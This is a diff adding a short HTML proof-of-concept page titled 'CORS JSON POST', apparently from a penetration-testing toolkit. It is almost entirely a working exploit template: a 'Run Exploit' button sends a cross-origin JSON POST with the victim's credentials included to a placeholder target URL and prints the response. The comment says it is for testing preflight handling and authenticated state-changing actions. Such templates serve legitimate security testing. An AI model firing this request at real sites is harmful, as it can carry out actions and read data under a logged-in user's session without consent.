@@ -1,0 +1,45 @@
+<!doctype html>
+<!--
+CORS PoC: JSON POST request.
+
+Useful when:
+- Testing preflight handling
+- Server allows Content-Type: application/json
+- Potential authenticated state-changing actions exist
+-->
+<html>
+<head>
+  <meta charset="utf-8">
+  <title>CORS JSON POST</title>
+</head>
+<body>
+
+<button id="run">Run Exploit</button>
+
+<script>
+  const TARGET_URL = "https://vulnerable-site.example/api/endpoint"; // change
+
+  document.getElementById("run").onclick = async () => {
+    try {
+      const response = await fetch(TARGET_URL, {
+        method: "POST",
+        credentials: "include",
+        headers: {
+          "Content-Type": "application/json"
+        },
+        body: JSON.stringify({
+          test: "cors"
+        })
+      });
+
+      const data = await response.text();
+      console.log("RESPONSE:", data);
+
+    } catch (err) {
+      console.error("Request failed:", err);
+    }
+  };
+</script>
+
+</body>
+</html>
